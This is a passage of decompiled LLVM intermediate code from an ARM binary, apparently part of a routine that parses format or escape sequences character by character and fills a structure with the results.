  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_e43c ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_e3d0 ], [ %stack_var_-48.1, %dec_label_pc_e378 ]
  %v1_e440 = inttoptr i32 %v0_e480 to i8*
  %v2_e440 = load i8, i8* %v1_e440, align 1
  %v3_e440 = zext i8 %v2_e440 to i32
  store i32 %v3_e440, i32* %r3.global-to-local, align 4
  %v7_e444 = icmp eq i8 %v2_e440, 42
  br i1 %v7_e444, label %dec_label_pc_e44c, label %dec_label_pc_e490

dec_label_pc_e44c:                                ; preds = %dec_label_pc_e440
  %v0_e44c = load i32, i32* %sb.global-to-local, align 4
  %v2_e44c = icmp eq i32 %v0_e44c, 0
  br i1 %v2_e44c, label %dec_label_pc_e480, label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e44c
  %v1_e454 = inttoptr i32 %v1_e484 to i8*
  %v2_e454 = load i8, i8* %v1_e454, align 1
  %v3_e454 = zext i8 %v2_e454 to i32
  store i32 %v3_e454, i32* %r3.global-to-local, align 4
  %v7_e458 = icmp eq i8 %v2_e454, 36
  br i1 %v7_e458, label %dec_label_pc_e460, label %dec_label_pc_e708

dec_label_pc_e460:                                ; preds = %dec_label_pc_e454
  %v0_e460 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_e460, 1
  br i1 %tmp134, label %dec_label_pc_e708, label %dec_label_pc_e468

dec_label_pc_e468:                                ; preds = %dec_label_pc_e460
  store i32 %v25_e274, i32* %r1.global-to-local, align 4
  %v0_e470 = load i32, i32* @lr, align 4
  %v3_e470 = mul i32 %v0_e470, -4
  %v4_e470 = add i32 %v3_e470, %v25_e274
  store i32 %v4_e470, i32* %r3.global-to-local, align 4
  %v1_e474 = add i32 %v1_e484, 1
  store i32 %v1_e474, i32* %r6.global-to-local, align 4
  %v2_e478 = add i32 %v4_e470, -24
  %v3_e478 = inttoptr i32 %v2_e478 to i32*
  store i32 %v0_e460, i32* %v3_e478, align 4
  br label %dec_label_pc_e48c

dec_label_pc_e480:                                ; preds = %dec_label_pc_e44c
  %v1_e480 = add i32 %v0_e480, 1
  store i32 %v1_e480, i32* %r3.global-to-local, align 4
  %v9_e484 = icmp eq i32 %v1_e480, %v1_e484
  br i1 %v9_e484, label %dec_label_pc_e48c, label %dec_label_pc_e708

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e480, %dec_label_pc_e468
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e490

dec_label_pc_e490:                                ; preds = %dec_label_pc_e440, %dec_label_pc_e48c
  %v0_e490 = load i32, i32* @lr, align 4
  %v2_e490 = icmp eq i32 %v0_e490, 0
  br i1 %v2_e490, label %dec_label_pc_e498, label %dec_label_pc_e2b0

dec_label_pc_e498:                                ; preds = %dec_label_pc_e490
  %v0_e498 = load i32, i32* %r6.global-to-local, align 4
  %v1_e498 = inttoptr i32 %v0_e498 to i8*
  %v2_e498 = load i8, i8* %v1_e498, align 1
  %v3_e498 = zext i8 %v2_e498 to i32
  store i32 %v3_e498, i32* %r3.global-to-local, align 4
  %v7_e49c = icmp eq i8 %v2_e498, 46
  br i1 %v7_e49c, label %.thread22, label %dec_label_pc_e4b0

.thread22:                                        ; preds = %dec_label_pc_e498
  %v2_e4a0 = add i32 %v0_e498, 1
  store i32 %v2_e4a0, i32* %r6.global-to-local, align 4
  %v1_e4a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_e4a4, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_e318

dec_label_pc_e4b0:                                ; preds = %dec_label_pc_e498
  %v0_e4b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e4b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e4b8

dec_label_pc_e4b8:                                ; preds = %dec_label_pc_e2b0, %dec_label_pc_e4b0
  %v0_e4c0.pre = phi i32 [ %v0_e498, %dec_label_pc_e4b0 ], [ %v0_e4c0.pre.pre, %dec_label_pc_e2b0 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_e4b0 ], [ %v0_e2b0, %dec_label_pc_e2b0 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16ea8.365 to i32), i32* %r1.global-to-local, align 4
  %v1_e4c0 = inttoptr i32 %v0_e4c0.pre to i8*
  br label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4cc, %dec_label_pc_e4b8
  %v0_e4cc = phi i32 [ %v1_e4cc, %dec_label_pc_e4cc ], [ ptrtoint ([9 x i8]* @global_var_16ea8.365 to i32), %dec_label_pc_e4b8 ]
  %v1_e4bc = inttoptr i32 %v0_e4cc to i8*
  %v2_e4bc = load i8, i8* %v1_e4bc, align 1
  %v3_e4bc = zext i8 %v2_e4bc to i32
  store i32 %v3_e4bc, i32* %r2.global-to-local, align 4
  %v2_e4c0 = load i8, i8* %v1_e4c0, align 1
  %v3_e4c0 = zext i8 %v2_e4c0 to i32
  store i32 %v3_e4c0, i32* %r3.global-to-local, align 4
  %v9_e4c4 = icmp eq i8 %v2_e4c0, %v2_e4bc
  br i1 %v9_e4c4, label %dec_label_pc_e2b8, label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4bc
  %v1_e4cc = add i32 %v0_e4cc, 1
  %v2_e4cc = inttoptr i32 %v1_e4cc to i8*
  %v3_e4cc = load i8, i8* %v2_e4cc, align 1
  %v4_e4cc = zext i8 %v3_e4cc to i32
  store i32 %v4_e4cc, i32* %r3.global-to-local, align 4
  store i32 %v1_e4cc, i32* %r1.global-to-local, align 4
  %v2_e4d0 = icmp eq i8 %v3_e4cc, 0
  br i1 %v2_e4d0, label %dec_label_pc_e4d8, label %dec_label_pc_e4bc

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e4cc, %dec_label_pc_e2b8
  %v1_e4f8 = phi i32 [ %v1_e2b8, %dec_label_pc_e2b8 ], [ %v0_e4c0.pre, %dec_label_pc_e4cc ]
  %v1_e4f4 = phi i32 [ %v0_e4cc, %dec_label_pc_e2b8 ], [ %v1_e4cc, %dec_label_pc_e4cc ]
  %v2_e4dc = sub i32 %v1_e4f4, ptrtoint ([9 x i8]* @global_var_16ea8.365 to i32)
  store i32 %v2_e4dc, i32* %r3.global-to-local, align 4
  %v8_e4e4 = icmp sgt i32 %v2_e4dc, 1
  br i1 %v8_e4e4, label %.thread25, label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e4d8
  %v1_e4e8 = inttoptr i32 %v1_e4f8 to i8*
  %v2_e4e8 = load i8, i8* %v1_e4e8, align 1
  %v3_e4e8 = zext i8 %v2_e4e8 to i32
  store i32 %v3_e4e8, i32* %r2.global-to-local, align 4
  %v1_e4ec = inttoptr i32 %v1_e4f4 to i8*
  %v2_e4ec = load i8, i8* %v1_e4ec, align 1
  %v3_e4ec = zext i8 %v2_e4ec to i32
  store i32 %v3_e4ec, i32* %r3.global-to-local, align 4
  %v9_e4f0 = icmp eq i8 %v2_e4e8, %v2_e4ec
  br i1 %v9_e4f0, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_e4e8
  %v2_e4f4 = add i32 %v1_e4f4, 9
  store i32 %v2_e4f4, i32* %r1.global-to-local, align 4
  %v2_e4f8 = add i32 %v1_e4f8, 1
  store i32 %v2_e4f8, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e4e8, %dec_label_pc_e4d8, %bb135
  %v0_e500 = phi i32 [ %v1_e4f4, %dec_label_pc_e4e8 ], [ %v1_e4f4, %dec_label_pc_e4d8 ], [ %v2_e4f4, %bb135 ]
  %v0_e4fc = phi i32 [ %v1_e4f8, %dec_label_pc_e4e8 ], [ %v1_e4f8, %dec_label_pc_e4d8 ], [ %v2_e4f8, %bb135 ]
  %v1_e4fc = inttoptr i32 %v0_e4fc to i8*
  %v2_e4fc = load i8, i8* %v1_e4fc, align 1
  %v3_e4fc = zext i8 %v2_e4fc to i32
  store i32 %v3_e4fc, i32* %r2.global-to-local, align 4
  %v1_e500 = add i32 %v0_e500, 9
  %v2_e500 = inttoptr i32 %v1_e500 to i8*
  %v3_e500 = load i8, i8* %v2_e500, align 1
  %v4_e500 = zext i8 %v3_e500 to i32
  store i32 %v4_e500, i32* %r3.global-to-local, align 4
  %v2_e504 = icmp eq i8 %v2_e4fc, 0
  %v3_e508 = mul nuw nsw i32 %v4_e500, 256
  store i32 %v3_e508, i32* @lr, align 4
  br i1 %v2_e504, label %dec_label_pc_e708, label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %.thread25
  %v3_e514 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_e514, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e518

dec_label_pc_e518:                                ; preds = %dec_label_pc_e59c, %dec_label_pc_e510
  %v1_e528 = phi i32 [ %v1_e59c, %dec_label_pc_e59c ], [ ptrtoint ([21 x i8]* @global_var_16ee8.367 to i32), %dec_label_pc_e510 ]
  %v1_e518 = inttoptr i32 %v1_e528 to i8*
  %v2_e518 = load i8, i8* %v1_e518, align 1
  %v3_e518 = zext i8 %v2_e518 to i32
  store i32 %v3_e518, i32* %r3.global-to-local, align 4
  %v9_e51c = icmp eq i8 %v2_e518, %v2_e4fc
  br i1 %v9_e51c, label %dec_label_pc_e524, label %dec_label_pc_e59c

dec_label_pc_e524:                                ; preds = %dec_label_pc_e518
  store i32 ptrtoint ([21 x i8]* @global_var_16ee8.367 to i32), i32* %r3.global-to-local, align 4
  %v2_e528 = sub i32 %v1_e528, ptrtoint ([21 x i8]* @global_var_16ee8.367 to i32)
  store i32 %v2_e528, i32* %r2.global-to-local, align 4
  %v7_e530 = icmp slt i32 %v2_e528, 18
  br i1 %v7_e530, label %bb137, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e524
  %v1_e534 = and i32 %v3_e508, 1024
  %v2_e534 = icmp eq i32 %v1_e534, 0
  br i1 %v2_e534, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_e534
  %v2_e538 = add i32 %v2_e528, -2
  store i32 %v2_e538, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_e524, %dec_label_pc_e534, %bb136
  %v0_e53c = phi i32 [ %v2_e528, %dec_label_pc_e524 ], [ %v2_e528, %dec_label_pc_e534 ], [ %v2_e538, %bb136 ]
  %v1_e53c = load i32, i32* %r7.global-to-local, align 4
  %v2_e53c = add i32 %v1_e53c, 32
  %v3_e53c = inttoptr i32 %v2_e53c to i32*
  store i32 %v0_e53c, i32* %v3_e53c, align 4
  store i32 ptrtoint (i32* @global_var_16edb.369 to i32), i32* %r1.global-to-local, align 4
  %v0_e548.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e544

dec_label_pc_e544:                                ; preds = %dec_label_pc_e544, %bb137
  %v0_e544 = phi i32 [ %v1_e544, %dec_label_pc_e544 ], [ ptrtoint (i32* @global_var_16edb.369 to i32), %bb137 ]
  %v1_e544 = add i32 %v0_e544, 1
  %v2_e544 = inttoptr i32 %v1_e544 to i8*
  %v3_e544 = load i8, i8* %v2_e544, align 1
  %v4_e544 = zext i8 %v3_e544 to i32
  store i32 %v4_e544, i32* %r3.global-to-local, align 4
  store i32 %v1_e544, i32* %r1.global-to-local, align 4
  %v8_e54c = icmp sgt i32 %v0_e548.pre, %v4_e544
  br i1 %v8_e54c, label %dec_label_pc_e544, label %dec_label_pc_e550

dec_label_pc_e550:                                ; preds = %dec_label_pc_e544
  store i32 ptrtoint (i32* @global_var_16ecc.373 to i32), i32* %r0.global-to-local, align 4
  %v2_e558 = sub i32 %v1_e544, ptrtoint (i32* @global_var_16edc.371 to i32)
  %v2_e55c = mul i32 %v2_e558, 2
  store i32 %v2_e55c, i32* %r3.global-to-local, align 4
  %v2_e564 = add i32 %v2_e55c, ptrtoint (i32* @global_var_16ecc.373 to i32)
  store i32 %v2_e564, i32* %r2.global-to-local, align 4
  %v1_e568 = add i32 %v2_e55c, add (i32 ptrtoint (i32* @global_var_16ecc.373 to i32), i32 1)
  %v2_e568 = inttoptr i32 %v1_e568 to i8*
  %v3_e568 = load i8, i8* %v2_e568, align 1
  %v4_e568 = zext i8 %v3_e568 to i32
  store i32 %v4_e568, i32* %r1.global-to-local, align 4
  %v2_e56c = add i32 %v2_e55c, ptrtoint (i32* @global_var_16ebc.375 to i32)
  store i32 %v2_e56c, i32* %r2.global-to-local, align 4
  %v3_e570 = inttoptr i32 %v2_e564 to i8*
  %v4_e570 = load i8, i8* %v3_e570, align 2
  %v6_e570 = zext i8 %v4_e570 to i32
  store i32 %v6_e570, i32* %r0.global-to-local, align 4
  %v1_e574 = add i32 %v2_e55c, add (i32 ptrtoint (i32* @global_var_16ebc.375 to i32), i32 1)
  %v2_e574 = inttoptr i32 %v1_e574 to i8*
  %v3_e574 = load i8, i8* %v2_e574, align 1
  %v4_e574 = zext i8 %v3_e574 to i32
  store i32 %v4_e574, i32* %r2.global-to-local, align 4
  %v3_e578 = inttoptr i32 %v2_e56c to i8*
  %v4_e578 = load i8, i8* %v3_e578, align 2
  %v6_e578 = zext i8 %v4_e578 to i32
  %v3_e57c = mul nuw i32 %v4_e568, 16777216
  store i32 %v3_e57c, i32* %r1.global-to-local, align 4
  %v4_e580 = sdiv i32 %v3_e57c, 65536
  %v5_e580 = or i32 %v6_e570, %v4_e580
  %v3_e584 = mul nuw i32 %v4_e574, 16777216
  store i32 %v3_e584, i32* %r2.global-to-local, align 4
  %v4_e588 = sdiv i32 %v3_e584, 65536
  %v5_e588 = or i32 %v6_e578, %v4_e588
  store i32 %v5_e588, i32* %r3.global-to-local, align 4
  %v0_e58c = load i32, i32* @lr, align 4
  %v2_e58c = or i32 %v5_e580, %v0_e58c
  store i32 ptrtoint ([21 x i8]* @global_var_16ee8.367 to i32), i32* @ip, align 4
  %v2_e594 = and i32 %v2_e58c, %v5_e588
  store i32 %v2_e594, i32* %r0.global-to-local, align 4
  %v0_e5b0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e5a8

dec_label_pc_e59c:                                ; preds = %dec_label_pc_e518
  %v1_e59c = add i32 %v1_e528, 1
  %v2_e59c = inttoptr i32 %v1_e59c to i8*
  %v3_e59c = load i8, i8* %v2_e59c, align 1
  %v4_e59c = zext i8 %v3_e59c to i32
  store i32 %v4_e59c, i32* %r3.global-to-local, align 4
  store i32 %v1_e59c, i32* @ip, align 4
  %v2_e5a0 = icmp eq i8 %v3_e59c, 0
  br i1 %v2_e5a0, label %dec_label_pc_e5a8, label %dec_label_pc_e518

dec_label_pc_e5a8:                                ; preds = %dec_label_pc_e59c, %dec_label_pc_e550
  %v0_e5b4 = phi i32 [ %v0_e58c, %dec_label_pc_e550 ], [ %v3_e508, %dec_label_pc_e59c ]
  %v0_e5b0 = phi i32 [ %v0_e5b0.pre, %dec_label_pc_e550 ], [ %v0_e4fc, %dec_label_pc_e59c ]
  %v0_e5a8 = phi i32 [ %v2_e594, %dec_label_pc_e550 ], [ %v3_e514, %dec_label_pc_e59c ]
  store i32 %v0_e5a8, i32* %stack_var_-36, align 4
  %v0_e5ac = load i32, i32* @r4, align 4
  %v1_e5ac = and i32 %v0_e5ac, 4
  %v1_e5b0 = inttoptr i32 %v0_e5b0 to i8*
  %v2_e5b0 = load i8, i8* %v1_e5b0, align 1
  %v3_e5b0 = zext i8 %v2_e5b0 to i32
  store i32 %v3_e5b0, i32* %r1.global-to-local, align 4
  %v1_e5b4 = and i32 %v0_e5b4, 3840
  %v1_e5b8 = and i32 %v0_e5ac, -5
  %v2_e5bc = or i32 %v1_e5b8, %v1_e5b4
  store i32 %v2_e5bc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_e5ac, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_e5cc = load i32, i32* %r7.global-to-local, align 4
  %v2_e5cc = add i32 %v1_e5cc, 12
  %v3_e5cc = inttoptr i32 %v2_e5cc to i32*
  store i32 %v3_e5b0, i32* %v3_e5cc, align 4
  %v0_e5d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_e5d0 = add i32 %v0_e5d0, 4
  %v2_e5d0 = inttoptr i32 %v1_e5d0 to i32*
  %v3_e5d0 = load i32, i32* @r5, align 4
  store i32 %v3_e5d0, i32* %v2_e5d0, align 4
  %v4_e5d0 = add i32 %v0_e5d0, 8
  %v5_e5d0 = inttoptr i32 %v4_e5d0 to i32*
  %v6_e5d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_e5d0, i32* %v5_e5d0, align 4
  %v0_e5d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e5d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_e5d4 = add i32 %v1_e5d4, 20
  %v3_e5d4 = inttoptr i32 %v2_e5d4 to i32*
  store i32 %v0_e5d4, i32* %v3_e5d4, align 4
  %v0_e5d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e5d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e5d8 = add i32 %v1_e5d8, 16
  %v3_e5d8 = inttoptr i32 %v2_e5d8 to i32*
  store i32 %v0_e5d8, i32* %v3_e5d8, align 4
  %v0_e5dc = load i32, i32* %r0.global-to-local, align 4
  %v1_e5dc = load i32, i32* %r7.global-to-local, align 4
  %v2_e5dc = add i32 %v1_e5dc, 28
  %v3_e5dc = inttoptr i32 %v2_e5dc to i32*
  store i32 %v0_e5dc, i32* %v3_e5dc, align 4
  %v0_e5e0 = load i32, i32* @ip, align 4
  %v1_e5e0 = inttoptr i32 %v0_e5e0 to i8*
  %v2_e5e0 = load i8, i8* %v1_e5e0, align 1
  %v3_e5e0 = zext i8 %v2_e5e0 to i32
  store i32 %v3_e5e0, i32* %r2.global-to-local, align 4
  %v2_e5e4 = icmp eq i8 %v2_e5e0, 0
  br i1 %v2_e5e4, label %dec_label_pc_e5ec, label %dec_label_pc_e604

dec_label_pc_e5ec:                                ; preds = %dec_label_pc_e5a8
  %v0_e5ec = load i32, i32* %r6.global-to-local, align 4
  %v1_e5ec = inttoptr i32 %v0_e5ec to i8*
  %v2_e5ec = load i8, i8* %v1_e5ec, align 1
  %v3_e5ec = zext i8 %v2_e5ec to i32
  store i32 %v3_e5ec, i32* %r3.global-to-local, align 4
  %v7_e5f0 = icmp eq i8 %v2_e5ec, 109
  br i1 %v7_e5f0, label %dec_label_pc_e5f8, label %dec_label_pc_e708

dec_label_pc_e5f8:                                ; preds = %dec_label_pc_e5ec
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_e5fc = load i32, i32* %r7.global-to-local, align 4
  %v2_e5fc = add i32 %v1_e5fc, 32
  %v3_e5fc = inttoptr i32 %v2_e5fc to i32*
  store i32 20, i32* %v3_e5fc, align 4
  %v0_e600 = load i32, i32* %r2.global-to-local, align 4
  %v1_e600 = load i32, i32* %r7.global-to-local, align 4
  %v2_e600 = add i32 %v1_e600, 28
  %v3_e600 = inttoptr i32 %v2_e600 to i32*
  store i32 %v0_e600, i32* %v3_e600, align 4
  br label %dec_label_pc_e604

dec_label_pc_e604:                                ; preds = %dec_label_pc_e5a8, %dec_label_pc_e5f8
  %v0_e604 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_e604, 1
  br i1 %tmp141, label %dec_label_pc_e6bc, label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e604
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e610

dec_label_pc_e610:                                ; preds = %dec_label_pc_e6a4, %dec_label_pc_e60c
  %v8_e62c = phi i32 [ 0, %dec_label_pc_e60c ], [ %v1_e6a8, %dec_label_pc_e6a4 ]
  %v7_e614 = icmp sgt i32 %v8_e62c, 2
  br i1 %v7_e614, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_e610
  store i32 %v25_e274, i32* %r2.global-to-local, align 4
  %v12_e618 = mul i32 %v8_e62c, 4
  %v13_e618 = add i32 %v12_e618, %v25_e274
  store i32 %v13_e618, i32* %r3.global-to-local, align 4
  %v9_e61c = add i32 %v13_e618, -24
  %v10_e61c = inttoptr i32 %v9_e61c to i32*
  %v11_e61c = load i32, i32* %v10_e61c, align 4
  store i32 %v11_e61c, i32* %r2.global-to-local, align 4
  %v9_e620 = load i32, i32* %r7.global-to-local, align 4
  %v10_e620 = add i32 %v9_e620, %v8_e62c
  store i32 %v10_e620, i32* %r3.global-to-local, align 4
  %v9_e628 = trunc i32 %v11_e61c to i8
  %v11_e628 = add i32 %v10_e620, 36
  %v12_e628 = inttoptr i32 %v11_e628 to i8*
  store i8 %v9_e628, i8* %v12_e628, align 1
  %v8_e630 = load i32, i32* %r3.global-to-local, align 4
  %v9_e630 = add i32 %v8_e630, 36
  %v10_e630 = inttoptr i32 %v9_e630 to i8*
  %v11_e630 = load i8, i8* %v10_e630, align 1
  %v12_e630 = zext i8 %v11_e630 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_e610
  %v10_e62c = add i32 %v8_e62c, %stack_var_-48.3
  store i32 %v10_e62c, i32* %r3.global-to-local, align 4
  %v9_e634 = add i32 %v10_e62c, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_e658 = phi i32 [ %v12_e630, %bb142 ], [ %v9_e634, %bb143 ]
  store i32 %v0_e658, i32* @r2, align 4
  %v1_e638 = load i32, i32* %sb.global-to-local, align 4
  %v2_e638 = sub i32 %v0_e658, %v1_e638
  %v4_e638 = xor i32 %v1_e638, %v0_e658
  %v5_e638 = xor i32 %v2_e638, %v0_e658
  %v6_e638 = and i32 %v5_e638, %v4_e638
  %v7_e638 = icmp slt i32 %v6_e638, 0
  %v8_e638 = icmp slt i32 %v2_e638, 0
  %v9_e638 = icmp eq i32 %v0_e658, %v1_e638
  %v3_e63c = xor i1 %v8_e638, %v7_e638
  %v4_e63c = or i1 %v9_e638, %v3_e63c
  br i1 %v4_e63c, label %dec_label_pc_e64c, label %dec_label_pc_e640

dec_label_pc_e640:                                ; preds = %bb144
  %v1_e640 = add i32 %v0_e658, -9
  %v3_e640 = sub i32 8, %v0_e658
  %v4_e640 = and i32 %v3_e640, %v0_e658
  %v5_e640 = icmp slt i32 %v4_e640, 0
  %v6_e640 = icmp slt i32 %v1_e640, 0
  %v7_e640 = icmp eq i32 %v0_e658, 9
  %v3_e644 = xor i1 %v6_e640, %v5_e640
  %v4_e644 = or i1 %v7_e640, %v3_e644
  br i1 %v4_e644, label %dec_label_pc_e648, label %dec_label_pc_e708

dec_label_pc_e648:                                ; preds = %dec_label_pc_e640
  store i32 %v0_e658, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %bb144, %dec_label_pc_e648
  store i32 %v25_e274, i32* @ip, align 4
  %v1_e650 = load i32, i32* %r8.global-to-local, align 4
  %v4_e650 = mul i32 %v1_e650, 4
  %v5_e650 = add i32 %v4_e650, %v25_e274
  store i32 %v5_e650, i32* %r3.global-to-local, align 4
  %v1_e654 = add i32 %v5_e650, -12
  %v2_e654 = inttoptr i32 %v1_e654 to i32*
  %v3_e654 = load i32, i32* %v2_e654, align 4
  store i32 %v3_e654, i32* %r5.global-to-local, align 4
  %v1_e658 = add i32 %v0_e658, -1
  store i32 %v1_e658, i32* %sl.global-to-local, align 4
  %v0_e65c = load i32, i32* %r7.global-to-local, align 4
  %v4_e65c = mul i32 %v1_e658, 4
  %v5_e65c = add i32 %v0_e65c, %v4_e65c
  store i32 %v5_e65c, i32* %r3.global-to-local, align 4
  %v7_e660 = icmp eq i32 %v3_e654, 8
  %v1_e664 = add i32 %v5_e65c, 40
  %v2_e664 = inttoptr i32 %v1_e664 to i32*
  %v3_e664 = load i32, i32* %v2_e664, align 4
  store i32 %v3_e664, i32* @r0, align 4
  br i1 %v7_e660, label %dec_label_pc_e6a4, label %dec_label_pc_e66c

dec_label_pc_e66c:                                ; preds = %dec_label_pc_e64c
  %v9_e66c = icmp eq i32 %v3_e664, %v3_e654
  br i1 %v9_e66c, label %dec_label_pc_e690, label %bb145

bb145:                                            ; preds = %dec_label_pc_e66c
  %v8_e670 = icmp eq i32 %v3_e664, 8
  br i1 %v8_e670, label %dec_label_pc_e690, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %bb145
  %v0_e678 = call i32 @function_e228()
  %v0_e680 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e680, i32* @r0, align 4
  %v0_e684 = call i32 @function_e228()
  store i32 %v0_e684, i32* %r0.global-to-local, align 4
  %v8_e68c = icmp sgt i32 %v0_e678, %v0_e684
  br i1 %v8_e68c, label %dec_label_pc_e6a4, label %dec_label_pc_e678.dec_label_pc_e690_crit_edge

dec_label_pc_e678.dec_label_pc_e690_crit_edge:    ; preds = %dec_label_pc_e678
  %v1_e694.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_e69c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_e69c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e678.dec_label_pc_e690_crit_edge, %dec_label_pc_e66c, %bb145
  %v1_e69c = phi i32 [ %v1_e69c.pre, %dec_label_pc_e678.dec_label_pc_e690_crit_edge ], [ %v1_e658, %dec_label_pc_e66c ], [ %v1_e658, %bb145 ]
  %v0_e69c = phi i32 [ %v0_e69c.pre, %dec_label_pc_e678.dec_label_pc_e690_crit_edge ], [ %v0_e65c, %dec_label_pc_e66c ], [ %v0_e65c, %bb145 ]
  %v1_e694 = phi i32 [ %v1_e694.pre, %dec_label_pc_e678.dec_label_pc_e690_crit_edge ], [ %v1_e650, %dec_label_pc_e66c ], [ %v1_e650, %bb145 ]
  store i32 %v25_e274, i32* %r1.global-to-local, align 4
  %v4_e694 = mul i32 %v1_e694, 4
  %v5_e694 = add i32 %v4_e694, %v25_e274
  store i32 %v5_e694, i32* %r3.global-to-local, align 4
  %v1_e698 = add i32 %v5_e694, -12
  %v2_e698 = inttoptr i32 %v1_e698 to i32*
  %v3_e698 = load i32, i32* %v2_e698, align 4
  store i32 %v3_e698, i32* @r2, align 4
  %v4_e69c = mul i32 %v1_e69c, 4
  %v5_e69c = add i32 %v4_e69c, %v0_e69c
  store i32 %v5_e69c, i32* %r3.global-to-local, align 4
  %v2_e6a0 = add i32 %v5_e69c, 40
  %v3_e6a0 = inttoptr i32 %v2_e6a0 to i32*
  store i32 %v3_e698, i32* %v3_e6a0, align 4
  br label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %dec_label_pc_e678, %dec_label_pc_e64c, %dec_label_pc_e690
  %v0_e6a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e6a4 = add i32 %v0_e6a4, 28
  %v2_e6a4 = inttoptr i32 %v1_e6a4 to i32*
  %v3_e6a4 = load i32, i32* %v2_e6a4, align 4
  %v0_e6a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_e6a8 = add i32 %v0_e6a8, 1
  store i32 %v1_e6a8, i32* %r8.global-to-local, align 4
  %v1_e6ac = add i32 %v3_e6a4, 2
  store i32 %v1_e6ac, i32* %r3.global-to-local, align 4
  %v6_e6b4 = icmp slt i32 %v1_e6a8, %v1_e6ac
  br i1 %v6_e6b4, label %dec_label_pc_e610, label %dec_label_pc_e6d4

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e604
  %v0_e6bc = load i32, i32* %r7.global-to-local, align 4
  %v1_e6bc = add i32 %v0_e6bc, 28
  %v2_e6bc = inttoptr i32 %v1_e6bc to i32*
  %v3_e6bc = load i32, i32* %v2_e6bc, align 4
  store i32 %v3_e6bc, i32* %r2.global-to-local, align 4
  %v0_e6c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_e6c0 = trunc i32 %v0_e6c0 to i8
  %v3_e6c0 = add i32 %v0_e6bc, 38
  %v4_e6c0 = inttoptr i32 %v3_e6c0 to i8*
  store i8 %v1_e6c0, i8* %v4_e6c0, align 1
  %v0_e6c4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e6c4 = mul i32 %v0_e6c4, 4
  store i32 %v3_e6c4, i32* @r2, align 4
  %v0_e6c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_e6c8 = add i32 %v0_e6c8, 40
  store i32 %v1_e6c8, i32* @r0, align 4
  %v2_e6cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_e6cc, i32* @r1, align 4
  %v0_e6d0 = call i32 @function_ef60()
  store i32 %v0_e6d0, i32* %r0.global-to-local, align 4
  %v0_e6d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6a4, %dec_label_pc_e6bc
  %v2_e6f0 = phi i32 [ %v0_e6d4.pre, %dec_label_pc_e6bc ], [ %v0_e6a4, %dec_label_pc_e6a4 ]
  %v1_e6d4 = add i32 %v2_e6f0, 16
  %v2_e6d4 = inttoptr i32 %v1_e6d4 to i32*
  %v3_e6d4 = load i32, i32* %v2_e6d4, align 4
  store i32 %v3_e6d4, i32* %r3.global-to-local, align 4
  %v1_e6d8 = and i32 %v3_e6d4, 128
  %v2_e6d8 = icmp eq i32 %v1_e6d8, 0
  br i1 %v2_e6d8, label %.thread46, label %.thread44

